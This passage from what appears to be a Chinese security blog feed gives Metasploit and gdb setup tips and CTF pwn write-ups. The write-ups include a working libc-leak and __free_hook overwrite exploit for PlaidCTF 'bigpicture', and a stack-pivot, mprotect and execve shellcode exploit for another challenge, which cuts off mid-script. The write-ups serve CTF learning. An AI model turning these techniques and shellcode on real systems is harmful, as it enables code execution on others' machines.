<h2 id="基本攻击"><a href="#基本攻击" class="headerlink" title="基本攻击"></a>基本攻击</h2><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><a href="https://www.i0day.com/1182.html" target="_blank" rel="external">metasploit终端命令大全 MSF</a></p>
<h2 id="一些小坑"><a href="#一些小坑" class="headerlink" title="一些小坑"></a>一些小坑</h2><ol>
<li><p>msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用<code>msfupdate</code>。如果在kali上用<code>msfupdate</code>可能会遇到未知错误。</p>
</li>
<li><p><code>Failed to connect to the database: could not connect to server: Connection refused</code>遇到注重错误一般是<code>postgresql</code>服务没开，按照<a href="https://community.rapid7.com/thread/9302" target="_blank" rel="external">官方回答</a>修改即可。</p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;体系框架&quot;&gt;&lt;a href=&quot;#体系框架&quot; class=&quot;headerlink&quot; title=&quot;体系框架&quot;&gt;&lt;/a&gt;体系框架&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2017/05/09/Metasploit-learning/m.png&quot; alt=&quot;框架&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Metasploit" scheme="http://reehy.top/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>pwn的一些小心得</title>
    <link href="http://reehy.top/2017/04/26/pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%BF%83%E5%BE%97/"/>
    <id>http://reehy.top/2017/04/26/pwn的一些小心得/</id>
    <published>2017-04-26T12:19:33.000Z</published>
    <updated>2017-05-14T11:56:27.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="libheaps与pwndbg兼容"><a href="#libheaps与pwndbg兼容" class="headerlink" title="libheaps与pwndbg兼容"></a>libheaps与pwndbg兼容</h2><p>其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。</p>
<p>注册command的文件在这个目录下：<br><code>/root/libheap/libheap/frontend/commands/gdb</code></p>
<p>改几个注册名就好，下面以我把<code>heap</code>改为<code>libheap</code>为例，当然可能改成<code>heap_lib</code>这种更合适。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">heap</span><span class="params">(gdb.Command)</span>:</span></div><div class="line">    <span class="string">"""libheap command help listing"""</span></div><div class="line"></div><div class="line"><span class="comment"># 主要就是__init__这里存在注册功能</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, debugger=None, version=None)</span>:</span></div><div class="line">        super(heap, self).__init__(<span class="string">"libheap"</span>, gdb.COMMAND_OBSCURE,</div><div class="line">                                   gdb.COMPLETE_NONE)</div></pre></td></tr></table></figure></p>
<p>当然，下面的功能名最好也改改。。。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">def invoke(self, arg, from_tty):</div><div class="line">    # XXX: self.dbg.string_to_argv</div><div class="line">    <span class="keyword">if</span> arg.find(<span class="string">"-h"</span>) != -1:</div><div class="line">        # print_header(<span class="string">"heap "</span>, end=<span class="string">""</span>)</div><div class="line">        # print(<span class="string">"Options:"</span>, end=<span class="string">"\n\n"</span>)</div><div class="line">        # print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"-a 0x1234"</span>))</div><div class="line">        # print(<span class="string">"Specify an arena address"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libheapls"</span>))</div><div class="line">        print(<span class="string">"Print a flat listing of all chunks in an arena"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libfastbins [#]"</span>))</div><div class="line">        print(<span class="string">"Print all fast bins, or only a single fast bin"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libsmallbins [#]"</span>))</div><div class="line">        print(<span class="string">"Print all small bins, or only a single small bin"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libfreebins"</span>))</div><div class="line">        print(<span class="string">"Print compact bin listing (only free chunks)"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libheaplsc"</span>))</div><div class="line">        print(<span class="string">"Print compact arena listing (all chunks)"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libmstats"</span>), end=<span class="string">""</span>)</div><div class="line">        print(<span class="string">"Print memory alloc statistics similar to malloc_stats(3)"</span>)</div><div class="line">        # print_header(<span class="string">"&#123;:&lt;22&#125;"</span>.format(<span class="string">"print_bin_layout [#]"</span>), end=<span class="string">""</span>)</div><div class="line">        # print(<span class="string">"Print the layout of a particular free bin"</span>)</div><div class="line">        <span class="keyword">return</span></div></pre></td></tr></table></figure></p>
<p>学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。</p>
<h2 id="新工具"><a href="#新工具" class="headerlink" title="新工具"></a>新工具</h2><p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="external">pwngdb一个专门用来打ctfpwn的gdb增强脚本</a></p>
<p>用来功能的确好用。</p>
<h2 id="i386的libc-dbg安装"><a href="#i386的libc-dbg安装" class="headerlink" title="i386的libc-dbg安装"></a>i386的libc-dbg安装</h2><p>在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dpkg --<span class="keyword">print</span>-architecture</div><div class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></div><div class="line">apt-<span class="built_in">get</span> install libc6-db<span class="variable">g:i386</span></div></pre></td></tr></table></figure></p>
<p><a href="https://askubuntu.com/questions/551840/unable-to-locate-package-libc6-dbgi386-in-docker/552273" target="_blank" rel="external">Unable to locate package libc6-dbg:i386 in docker</a></p>
<h2 id="gdb一些命令"><a href="#gdb一些命令" class="headerlink" title="gdb一些命令"></a>gdb一些命令</h2><p><code>watch expr</code> 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行<br><code>rwatch expr</code>设置读watchpoint，当应用程序读表达式expr时，程序停止运行<br><code>awatch expr</code>设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;libheaps与pwndbg兼容&quot;&gt;&lt;a href=&quot;#libheaps与pwndbg兼容&quot; class=&quot;headerlink&quot; title=&quot;libheaps与pwndbg兼容&quot;&gt;&lt;/a&gt;libheaps与pwndbg兼容&lt;/h2&gt;&lt;p&gt;其实本来也不存在co
    
    </summary>
    
    
      <category term="pwndbg" scheme="http://reehy.top/tags/pwndbg/"/>
    
      <category term="libheap" scheme="http://reehy.top/tags/libheap/"/>
    
  </entry>
  
  <entry>
    <title>2017PlaidCTF bigpicture</title>
    <link href="http://reehy.top/2017/04/26/2017PlaidCTF-bigpicture/"/>
    <id>http://reehy.top/2017/04/26/2017PlaidCTF-bigpicture/</id>
    <published>2017-04-26T10:43:50.000Z</published>
    <updated>2017-04-26T11:00:27.432Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bigpicture"><a href="#bigpicture" class="headerlink" title="bigpicture"></a>bigpicture</h2><p>我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。</p>
<p>给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。</p>
<p>明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。</p>
<p>推荐一个工具<strong><a href="https://github.com/david942j/one_gadget" target="_blank" rel="external">one_gadget</a></strong>，正如作者所说</p>
<blockquote>
<p>This gem provides such gadgets finder, no need to use IDA-pro every time like a fool.</p>
</blockquote>
<p>嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。</p>
<p>用到了一个<code>calloc</code>函数，第一次是在0CTF中遇到，和<code>malloc</code>功能相同，但是会把分配得到的内存清<code>0</code>。<br>学到一个快速查看函数的方法，如：<code>man calloc</code><br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">MALLOC(<span class="number">3</span>)                                                                                 Linux Programmer<span class="symbol">'s</span> Manual                                                                                 MALLOC(<span class="number">3</span>)</div><div class="line"></div><div class="line">NAME</div><div class="line">       malloc, free, calloc, realloc - allocate <span class="keyword">and</span> free dynamic memory</div><div class="line"></div><div class="line">SYNOPSIS</div><div class="line">       #include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">       void *malloc(size_t size);</div><div class="line">       void free(void *ptr);</div><div class="line">       void *calloc(size_t nmemb, size_t size);</div><div class="line">       void *realloc(void *ptr, size_t size);</div><div class="line"></div><div class="line">DESCRIPTION</div><div class="line">       The  malloc() <span class="keyword">function</span> allocates size bytes <span class="keyword">and</span> returns a pointer <span class="keyword">to</span> the allocated memory.  The memory <span class="keyword">is</span> <span class="keyword">not</span> initialized.  <span class="keyword">If</span> size <span class="keyword">is</span> <span class="number">0</span>, <span class="keyword">then</span> malloc() returns either <span class="keyword">NULL</span>, <span class="keyword">or</span> a unique pointer value</div><div class="line">       that can later be successfully passed <span class="keyword">to</span> free().</div><div class="line"></div><div class="line">       The free() <span class="keyword">function</span> frees the memory space pointed <span class="keyword">to</span> by ptr, which must have been returned by a previous call <span class="keyword">to</span> malloc(), calloc(), <span class="keyword">or</span> realloc().  Otherwise,  <span class="keyword">or</span>  <span class="keyword">if</span>  free(ptr)  has  already  been</div><div class="line">       called before, undefined behavior occurs.  <span class="keyword">If</span> ptr <span class="keyword">is</span> <span class="keyword">NULL</span>, no operation <span class="keyword">is</span> performed.</div><div class="line"></div><div class="line">       The  calloc() <span class="keyword">function</span> allocates memory <span class="keyword">for</span> an <span class="keyword">array</span> <span class="keyword">of</span> nmemb elements <span class="keyword">of</span> size bytes each <span class="keyword">and</span> returns a pointer <span class="keyword">to</span> the allocated memory.  The memory <span class="keyword">is</span> set <span class="keyword">to</span> zero.  <span class="keyword">If</span> nmemb <span class="keyword">or</span> size <span class="keyword">is</span> <span class="number">0</span>, <span class="keyword">then</span> cal‐</div><div class="line">       loc() returns either <span class="keyword">NULL</span>, <span class="keyword">or</span> a unique pointer value that can later be successfully passed <span class="keyword">to</span> free().</div><div class="line"></div><div class="line">       The realloc() <span class="keyword">function</span> changes the size <span class="keyword">of</span> the memory <span class="keyword">block</span> pointed <span class="keyword">to</span> by ptr <span class="keyword">to</span> size bytes.  The contents will be unchanged <span class="keyword">in</span> the <span class="keyword">range</span> from the start <span class="keyword">of</span> the region up <span class="keyword">to</span> the minimum  <span class="keyword">of</span>  the  old</div><div class="line">       <span class="keyword">and</span>  <span class="keyword">new</span>  sizes.  <span class="keyword">If</span> the <span class="keyword">new</span> size <span class="keyword">is</span> larger than the old size, the added memory will <span class="keyword">not</span> be initialized.  <span class="keyword">If</span> ptr <span class="keyword">is</span> <span class="keyword">NULL</span>, <span class="keyword">then</span> the call <span class="keyword">is</span> equivalent <span class="keyword">to</span> malloc(size), <span class="keyword">for</span> <span class="keyword">all</span> values <span class="keyword">of</span> size; <span class="keyword">if</span> size</div><div class="line">       <span class="keyword">is</span> equal <span class="keyword">to</span> zero, <span class="keyword">and</span> ptr <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">NULL</span>, <span class="keyword">then</span> the call <span class="keyword">is</span> equivalent <span class="keyword">to</span> free(ptr).  Unless ptr <span class="keyword">is</span> <span class="keyword">NULL</span>, it must have been returned by an earlier call <span class="keyword">to</span> malloc(), calloc() <span class="keyword">or</span> realloc().  <span class="keyword">If</span>  the  area</div><div class="line">       pointed <span class="keyword">to</span> was moved, a free(ptr) <span class="keyword">is</span> done.</div><div class="line"></div><div class="line"><span class="keyword">RETURN</span> VALUE</div><div class="line">       The malloc() <span class="keyword">and</span> calloc() functions <span class="keyword">return</span> a pointer <span class="keyword">to</span> the allocated memory, which <span class="keyword">is</span> suitably aligned <span class="keyword">for</span> any built-<span class="keyword">in</span> <span class="keyword">type</span>.  <span class="keyword">On</span> <span class="literal">error</span>, these functions <span class="keyword">return</span> <span class="keyword">NULL</span>.  <span class="keyword">NULL</span> may also be returned by a</div><div class="line">       successful call <span class="keyword">to</span> malloc() <span class="keyword">with</span> a size <span class="keyword">of</span> zero, <span class="keyword">or</span> by a successful call <span class="keyword">to</span> calloc() <span class="keyword">with</span> nmemb <span class="keyword">or</span> size equal <span class="keyword">to</span> zero.</div><div class="line"></div><div class="line">       The free() <span class="keyword">function</span> returns no value.</div><div class="line"></div><div class="line">       The realloc() <span class="keyword">function</span> returns a pointer <span class="keyword">to</span> the newly allocated memory, which <span class="keyword">is</span> suitably aligned <span class="keyword">for</span> any built-<span class="keyword">in</span> <span class="keyword">type</span> <span class="keyword">and</span> may be different from ptr, <span class="keyword">or</span> <span class="keyword">NULL</span> <span class="keyword">if</span> the  request  fails.   <span class="keyword">If</span>  size  was</div><div class="line">       equal <span class="keyword">to</span> <span class="number">0</span>, either <span class="keyword">NULL</span> <span class="keyword">or</span> a pointer suitable <span class="keyword">to</span> be passed <span class="keyword">to</span> free() <span class="keyword">is</span> returned.  <span class="keyword">If</span> realloc() fails, the original <span class="keyword">block</span> <span class="keyword">is</span> left untouched; it <span class="keyword">is</span> <span class="keyword">not</span> freed <span class="keyword">or</span> moved.</div><div class="line"></div><div class="line">ERRORS</div><div class="line">       calloc(), malloc(), <span class="keyword">and</span> realloc() can fail <span class="keyword">with</span> the following <span class="literal">error</span>:</div><div class="line"></div><div class="line">       ENOMEM <span class="keyword">Out</span> <span class="keyword">of</span> memory.  Possibly, the application hit the RLIMIT_AS <span class="keyword">or</span> RLIMIT_DATA limit described <span class="keyword">in</span> getrlimit(<span class="number">2</span>).</div><div class="line"></div><div class="line">ATTRIBUTES</div><div class="line">       <span class="keyword">For</span> an explanation <span class="keyword">of</span> the terms used <span class="keyword">in</span> this section, see attributes(<span class="number">7</span>).</div><div class="line"></div><div class="line">       ┌─────────────────────┬───────────────┬─────────┐</div><div class="line">       │Interface            │ <span class="keyword">Attribute</span>     │ Value   │</div><div class="line">       ├─────────────────────┼───────────────┼─────────┤</div><div class="line">       │malloc(), free(),    │ Thread safety │ MT-Safe │</div><div class="line">       │calloc(), realloc()  │               │         │</div><div class="line">       └─────────────────────┴───────────────┴─────────┘</div><div class="line">...</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>思路：</p>
<ol>
<li>利用任意地址读泄露libc基址</li>
<li>将<code>__free_hook</code>修改为<code>one_gadget</code></li>
</ol>
<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line">local = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> local:</div><div class="line">    p = process(<span class="string">'./bigpicture'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">offset = <span class="number">0x109000</span> + <span class="number">16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(address, data)</span>:</span></div><div class="line">    t = <span class="number">0</span></div><div class="line">    address -= <span class="number">0x398000</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset - (address - libc.address), offset - (address - libc.address) - <span class="number">8</span>, <span class="number">-1</span>):</div><div class="line">        k = -i</div><div class="line">        p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">        p.sendline(<span class="string">'0, &#123;&#125;, &#123;&#125;'</span>.format(k, data[t]))</div><div class="line">        t += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'big?'</span>)</div><div class="line">    p.sendline(<span class="string">'1000 x 1000'</span>)</div><div class="line">    leak_realloc = <span class="string">''</span>       <span class="comment"># _dl_runtime_resolve_avx_slow</span></div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x109000</span> - <span class="number">24</span>, <span class="number">0x109000</span> - <span class="number">30</span>, <span class="number">-1</span>):</div><div class="line">        k = -i</div><div class="line">        p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">        p.sendline(<span class="string">'0, &#123;&#125;, r'</span>.format(k))</div><div class="line">        p.recvuntil(<span class="string">'overwriting '</span>)</div><div class="line">        leak_realloc = p.recv(<span class="number">1</span>) + leak_realloc</div><div class="line">    <span class="keyword">print</span> leak_realloc.encode(<span class="string">'hex'</span>)</div><div class="line">    leak_realloc = int(leak_realloc.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</div><div class="line">    libc.address = leak_realloc - libc.plt[<span class="string">'realloc'</span>] - <span class="number">6</span> - <span class="number">0x10</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'libc.address =&gt; '</span>, hex(libc.address)</div><div class="line">    __free_hook_addr = libc.symbols[<span class="string">'__free_hook'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'__free_hook =&gt; '</span>, hex(libc.symbols[<span class="string">'__free_hook'</span>])</div><div class="line">    one_gadget = libc.address + <span class="number">0x3f33a</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'one_gadget =&gt; '</span>, hex(one_gadget)</div><div class="line">    edit(__free_hook_addr, p64(one_gadget))</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.sendline(<span class="string">'quit'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;bigpicture&quot;&gt;&lt;a href=&quot;#bigpicture&quot; class=&quot;headerlink&quot; title=&quot;bigpicture&quot;&gt;&lt;/a&gt;bigpicture&lt;/h2&gt;&lt;p&gt;我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。&lt;/p&gt;
&lt;p
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>pwn中的栈迁移</title>
    <link href="http://reehy.top/2017/04/26/pwn%E4%B8%AD%E7%9A%84%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <id>http://reehy.top/2017/04/26/pwn中的栈迁移/</id>
    <published>2017-04-26T08:38:17.000Z</published>
    <updated>2017-04-29T08:04:21.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>连着好几次遇到栈迁移问题了，总结记录下。<br>每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：</p>
<ol>
<li>stack pivot后mprotect</li>
<li>ebp的partial overwrite</li>
<li>栈迁移的gadget</li>
</ol>
<h2 id="i春秋百度杯try-to-pwn"><a href="#i春秋百度杯try-to-pwn" class="headerlink" title="i春秋百度杯try to pwn"></a>i春秋百度杯try to pwn</h2><p>我们用<code>0xff</code>来填充<code>FILE</code>结构体，尝试中发现填充为其他数据的话会出现调用到其他函数而报错的情况。</p>
<p>eax由这条语句赋值，其中ebx与eax的值为：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">EAX</span>  <span class="number">0x80efa9c</span> (x+<span class="number">188</span>) —▸ <span class="number">0x80e2b6d</span> (__EH_FRAME_BEGIN__+<span class="number">38021</span>) ◂— <span class="keyword">pop</span>    <span class="built_in">esp</span></div><div class="line"><span class="built_in">EBX</span>  <span class="number">0x80efa04</span> (x+<span class="number">36</span>) ◂— <span class="number">0xffffff7f</span></div></pre></td></tr></table></figure></p>
<p><code>0x804f915 &lt;fclose+53&gt;     mov    eax, dword ptr [ebx + 0x94]</code><br>ebx的值为<code>fake_FILE_addr+36</code><br>eax的值为<code>fake_vtable</code>的前4个字节</p>
<p>我们存储shellcode的地址的addr为<code>fake_vtable</code>的4到8个字节。</p>
<p>还要注意下mprotexct的函数调用规定<br><code>int mprotect(void *addr, size_t len, int prot);</code><br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mprotect()  changes  the  access protections <span class="keyword">for</span> the calling process's memory pages containing <span class="built_in">any</span> part <span class="keyword">of</span> the address <span class="built_in">range</span> <span class="keyword">in</span> the interval [<span class="keyword">addr</span>, <span class="keyword">addr</span>+len-<span class="number">1</span>].  <span class="keyword">addr</span> must be aligned  to  a page boundary.</div></pre></td></tr></table></figure></p>
<p>注意这里的地址调用一定是<strong>页对齐</strong>的。<br><code>int prot</code>这里的数字可以简单参照linux的权限<code>rwx</code>，总是7是可读可写可执行。</p>
<p>这一题在尝试过程中发现\x0b会截断，所以我们要吧pwntools产生的shellcode简单修改下。</p>
<p>exp(参考了<a href="http://blog.csdn.net/qq_29343201/article/details/69666824" target="_blank" rel="external">这篇文章</a>)：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding=utf-<span class="number">8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line">local = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="meta">global</span> p</div><div class="line"></div><div class="line">if slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line">if local:</div><div class="line">    p = process(<span class="string">'./fake'</span>)</div><div class="line"><span class="symbol">else:</span></div><div class="line">    p = remote()</div><div class="line"></div><div class="line">if local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./fake'</span>)</div><div class="line">name_addr = <span class="number">0x80EF9E0</span></div><div class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</div><div class="line">un_FILE_addr = <span class="number">0x80EFA00</span></div><div class="line">fake_FILE_addr = <span class="number">0x80EFA04</span></div><div class="line">fake_vtable_addr = fake_FILE_addr + <span class="number">0x94</span> + <span class="number">0x4</span></div><div class="line">x_r = <span class="number">0x08048f66</span></div><div class="line">p_r = <span class="number">0x080e2b6d</span></div><div class="line"></div><div class="line">offset = un_FILE_addr - name_addr</div><div class="line"></div><div class="line">shellcode = <span class="string">'''</span></div><div class="line">/* execve(path=<span class="string">'/bin///sh'</span>, argv=[<span class="string">'sh'</span>], envp=<span class="number">0</span>) */</div><div class="line">/* <span class="keyword">push</span> <span class="string">'/bin///sh\x00'</span> */</div><div class="line"><span class="keyword">push</span> <span class="number">0x68</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x732f2f2f</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x6e69622f</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">esp</span></div><div class="line">/* <span class="keyword">push</span> argument array [<span class="string">'sh\x00'</span>] */</div><div class="line">/* <span class="keyword">push</span> <span class="string">'sh\x00\x00'</span> */</div><div class="line"><span class="keyword">push</span> <span class="number">0x1010101</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="number">0x1016972</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ecx</span> /* null terminate */</div><div class="line"><span class="keyword">push</span> <span class="number">4</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ecx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ecx</span> /* <span class="string">'sh\x00'</span> */</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">/* <span class="keyword">call</span> execve() */</div><div class="line">/* <span class="keyword">push</span> SYS_execve */</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0xf</span></div><div class="line"><span class="keyword">sub</span> <span class="built_in">eax</span>, <span class="number">0x4</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">eax</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span></div><div class="line"><span class="string">'''</span></div><div class="line"></div><div class="line">def 